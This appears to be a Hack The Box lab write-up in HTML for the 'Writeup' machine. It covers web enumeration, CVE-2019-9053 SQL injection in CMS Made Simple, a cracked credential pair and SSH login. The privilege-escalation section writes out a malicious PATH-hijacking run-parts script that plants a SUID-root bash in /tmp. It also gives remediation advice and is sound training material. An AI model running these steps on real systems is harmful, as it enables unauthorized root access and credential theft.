@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Writeup - Hack The Box Report</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header>
+    <h1>Writeup</h1>
+    <p>Hack The Box machine report covering web enumeration, CMS Made Simple SQL injection, credential cracking, SSH access, and Linux privilege escalation through PATH hijacking.</p>
+  </header>
+
+  <main>
+    <section>
+      <h2>Machine Information</h2>
+      <table>
+        <tr><th>Machine</th><td>Writeup</td></tr>
+        <tr><th>Platform</th><td>Hack The Box</td></tr>
+        <tr><th>Operating System</th><td>Linux</td></tr>
+        <tr><th>Difficulty</th><td>Easy</td></tr>
+        <tr><th>Target IP</th><td>10.129.29.59</td></tr>
+        <tr><th>Initial Access</th><td>CMS Made Simple CVE-2019-9053 SQL injection and cracked credentials</td></tr>
+        <tr><th>Privilege Escalation</th><td>PATH hijacking through writable /usr/local/bin/run-parts</td></tr>
+      </table>
+    </section>
+
+    <section>
+      <h2>Summary</h2>
+      <p>
+        Writeup exposed a small web application on port <code>80</code> and SSH on port <code>22</code>.
+        The homepage included a warning about an Eeyore DoS protection script, so I avoided aggressive
+        brute forcing and focused on careful manual enumeration. The <code>robots.txt</code> file revealed
+        the hidden <code>/writeup/</code> path.
+      </p>
+      <p>
+        The <code>/writeup/</code> directory hosted CMS Made Simple. The detected CMS version was vulnerable
+        to CVE-2019-9053, an unauthenticated SQL injection vulnerability. Using the vulnerability, I extracted
+        password hash material for the user <code>jkr</code>, cracked it, and used the recovered credentials
+        to log in over SSH.
+      </p>
+      <p>
+        After gaining access as <code>jkr</code>, local enumeration showed that the user could write to
+        <code>/usr/local/bin</code>. Since that directory appeared early in the PATH, I abused a PATH hijacking
+        weakness by placing a malicious <code>run-parts</code> script there. When root executed
+        <code>run-parts</code>, my script created a SUID-root Bash binary, allowing root access.
+      </p>
+    </section>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>I started with a TCP scan to identify exposed services on the target.</p>
+
+      <pre><code>nmap -sC -sV -oN Files/nmap_initial 10.129.29.59</code></pre>
+
+      <p>The important open ports were:</p>
+
+      <pre><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+      <p>The HTTP service showed Apache running on Debian:</p>
+
+      <pre><code>Server: Apache/2.4.25 (Debian)</code></pre>
+
+      <p>
+        The web page title suggested that the site was not fully built yet.
+      </p>
+
+      <pre><code>&lt;title&gt;Nothing here yet.&lt;/title&gt;</code></pre>
+
+      <p>
+        The page also exposed a contact email address:
+      </p>
+
+      <pre><code>jkr@writeup.htb</code></pre>
+
+      <p>
+        This was useful because <code>jkr</code> later turned out to be a valid system username.
+      </p>
+    </section>
+
+    <section>
+      <h2>Web Enumeration</h2>
+      <p>
+        The homepage warned about an Eeyore DoS protection script that could ban clients causing too many
+        Apache <code>40x</code> errors. Because of this, I avoided noisy directory brute forcing and checked
+        common files manually.
+      </p>
+
+      <pre><code>curl http://10.129.29.59/robots.txt</code></pre>
+
+      <p>The <code>robots.txt</code> file revealed a hidden path:</p>
+
+      <pre><code>Disallow: /writeup/</code></pre>
+
+      <p>I then visited the discovered directory:</p>
+
+      <pre><code>curl http://10.129.29.59/writeup/</code></pre>
+
+      <p>The page contained links to multiple writeups:</p>
+
+      <pre><code>/writeup/index.php?page=ypuffy
+/writeup/index.php?page=blue
+/writeup/index.php?page=writeup</code></pre>
+
+      <p>The page source also showed the base path:</p>
+
+      <pre><code>&lt;base href="http://writeup.htb/writeup/" /&gt;</code></pre>
+
+      <p>
+        Based on the page metadata and structure, the site was identified as CMS Made Simple.
+      </p>
+    </section>
+
+    <section>
+      <h2>Vulnerability Identification</h2>
+      <p>
+        CMS Made Simple was detected at <code>/writeup/</code>. The version was associated with
+        CVE-2019-9053, an unauthenticated SQL injection vulnerability.
+      </p>
+
+      <pre><code>CMS Made Simple 2.2.9
+CVE-2019-9053
+Unauthenticated SQL Injection</code></pre>
+
+      <p>
+        A public exploit was available as <code>46635.py</code>, but it was written for Python 2.
+        Since Python 2 was not available locally, I used a Python 3-compatible exploit source instead.
+      </p>
+
+      <pre><code>https://github.com/hf3cyber/CMS-Made-Simple-2.2.9-Unauthenticated-SQL-Injection-Exploit-CVE-2019-9053-</code></pre>
+    </section>
+
+    <section>
+      <h2>Initial Access</h2>
+      <p>
+        The SQL injection was used to extract credential material from the CMS database.
+        An early result produced an unreliable salt value:
+      </p>
+
+      <pre><code>Hash: 62def4866937f08cc13bab43bb14e6f7
+Salt: 1</code></pre>
+
+      <p>
+        This appeared to be a false positive or bad result from the time-based SQL injection, because
+        cracking with that salt did not work.
+      </p>
+
+      <p>A reliable hash and salt were later extracted:</p>
+
+      <pre><code>Hash: 62def4866937f08cc13bab43bb14e6f7
+Salt: 5a599ef579066807</code></pre>
+
+      <p>
+        Hashcat showed that the hash was already cracked in the potfile. The recovered credentials were:
+      </p>
+
+      <pre><code>Username: jkr
+Password: raykayjay9</code></pre>
+
+      <p>I used the credentials to log in over SSH:</p>
+
+      <pre><code>ssh jkr@10.129.29.59</code></pre>
+
+      <p>The login succeeded and provided a shell as <code>jkr</code>.</p>
+
+      <pre><code>whoami
+jkr</code></pre>
+    </section>
+
+    <section>
+      <h2>User Flag</h2>
+      <p>
+        After logging in as <code>jkr</code>, I read the user flag from the user's home directory.
+      </p>
+
+      <pre><code>cat /home/jkr/user.txt</code></pre>
+
+      <pre><code>user flag: [REDACTED]</code></pre>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation Enumeration</h2>
+      <p>
+        I started local enumeration by checking the current user, groups, writable paths, PATH order,
+        and SUID binaries.
+      </p>
+
+      <pre><code>id
+echo $PATH
+find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+
+      <p>The SUID binaries included:</p>
+
+      <pre><code>/usr/bin/pkexec
+/bin/su
+/bin/mount
+/bin/umount
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/bin/vmware-user-suid-wrapper</code></pre>
+
+      <p>
+        The important discovery was that <code>jkr</code> had access related to the <code>staff</code> group,
+        and could write to <code>/usr/local/bin</code>.
+      </p>
+
+      <pre><code>ls -ld /usr/local/bin</code></pre>
+
+      <p>
+        Since <code>/usr/local/bin</code> appeared early in the PATH, this created a possible PATH hijacking
+        opportunity. If a root-owned process executed a command by name instead of using an absolute path,
+        Linux could run a malicious command from <code>/usr/local/bin</code> first.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation with PATH Hijacking</h2>
+      <p>
+        The target eventually executed <code>run-parts</code> as root without specifying the full path.
+        Because I could write to <code>/usr/local/bin</code>, I created a malicious
+        <code>run-parts</code> script in that directory.
+      </p>
+
+      <pre><code>cat &gt; /usr/local/bin/run-parts &lt;&lt;'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF</code></pre>
+
+      <p>I made the script executable:</p>
+
+      <pre><code>chmod +x /usr/local/bin/run-parts</code></pre>
+
+      <p>
+        After the root-executed process triggered <code>run-parts</code>, the script created a SUID-root
+        Bash binary in <code>/tmp</code>.
+      </p>
+
+      <pre><code>ls -la /tmp/rootbash</code></pre>
+
+      <p>The file had the SUID bit set and was owned by root:</p>
+
+      <pre><code>-rwsr-xr-x 1 root root 1099016 Jul  8 02:30 /tmp/rootbash</code></pre>
+
+      <p>
+        I executed Bash with the <code>-p</code> option to preserve the effective user ID:
+      </p>
+
+      <pre><code>/tmp/rootbash -p</code></pre>
+
+      <p>Root access was confirmed:</p>
+
+      <pre><code>id
+uid=1000(jkr) euid=0(root)</code></pre>
+    </section>
+
+    <section>
+      <h2>Root Flag</h2>
+      <p>
+        With effective root privileges, I was able to access the root flag.
+      </p>
+
+      <pre><code>cat /root/root.txt</code></pre>
+
+      <pre><code>root flag: [REDACTED]</code></pre>
+    </section>
+
+    <section>
+      <h2>Cleanup</h2>
+      <p>
+        After completing the machine, cleanup would include removing the malicious files created during
+        privilege escalation.
+      </p>
+
+      <pre><code>rm -f /usr/local/bin/run-parts
+rm -f /tmp/rootbash</code></pre>
+    </section>
+
+    <section>
+      <h2>Attack Path</h2>
+      <pre><code>1. Enumerated open ports and found SSH and HTTP.
+2. Checked the web service and found Apache on Debian.
+3. Reviewed robots.txt and discovered /writeup/.
+4. Identified CMS Made Simple at /writeup/.
+5. Matched the CMS to CVE-2019-9053.
+6. Exploited unauthenticated SQL injection to extract credential material.
+7. Cracked the hash and recovered jkr:raykayjay9.
+8. Logged in over SSH as jkr.
+9. Found that jkr could write to /usr/local/bin.
+10. Abused PATH hijacking by creating /usr/local/bin/run-parts.
+11. Waited for root to execute run-parts through PATH.
+12. Created /tmp/rootbash with SUID-root permissions.
+13. Ran /tmp/rootbash -p and gained effective root privileges.</code></pre>
+    </section>
+
+    <section>
+      <h2>Lessons Learned</h2>
+      <ul>
+        <li><code>robots.txt</code> can reveal hidden application paths that are not linked from the main page.</li>
+        <li>Warnings about anti-bruteforce or DoS protection should change the enumeration approach.</li>
+        <li>CMS metadata can quickly point to known public vulnerabilities.</li>
+        <li>Older public exploits may need to be converted or replaced if they depend on Python 2.</li>
+        <li>Time-based SQL injection can produce bad data, so extracted hashes and salts should be validated.</li>
+        <li>Password reuse between a web application and a Linux account can turn a web bug into SSH access.</li>
+        <li>Linux group membership matters during privilege escalation.</li>
+        <li>Writable directories early in PATH can be dangerous when privileged scripts call binaries by name.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Remediation</h2>
+      <ul>
+        <li>Upgrade CMS Made Simple to a patched version that is not vulnerable to CVE-2019-9053.</li>
+        <li>Remove old or unused CMS installations from production systems.</li>
+        <li>Do not rely on <code>robots.txt</code> to hide sensitive paths.</li>
+        <li>Use unique passwords for web applications and system accounts.</li>
+        <li>Disable SSH password authentication where possible and prefer SSH keys.</li>
+        <li>Restrict write access to directories included in privileged PATH values.</li>
+        <li>Ensure root-owned scripts use absolute paths such as <code>/bin/run-parts</code> or <code>/usr/bin/run-parts</code>.</li>
+        <li>Set a safe PATH inside privileged scripts.</li>
+        <li>Monitor for suspicious files created in <code>/usr/local/bin</code> and <code>/tmp</code>.</li>
+        <li>Regularly audit SUID files for unexpected additions.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Conclusion</h2>
+      <p>
+        Writeup demonstrated how careful web enumeration can lead to a hidden application and how a known
+        CMS vulnerability can provide valid credentials. The exposed CMS Made Simple instance allowed
+        unauthenticated SQL injection, which led to credential recovery for the <code>jkr</code> user.
+      </p>
+      <p>
+        After SSH access was obtained, privilege escalation came from a Linux PATH hijacking weakness.
+        Because <code>jkr</code> could write to <code>/usr/local/bin</code>, and a root process executed
+        <code>run-parts</code> by name, I was able to create a SUID-root Bash binary and gain root access.
+      </p>
+    </section>
+  </main>
+</body>
+</html>
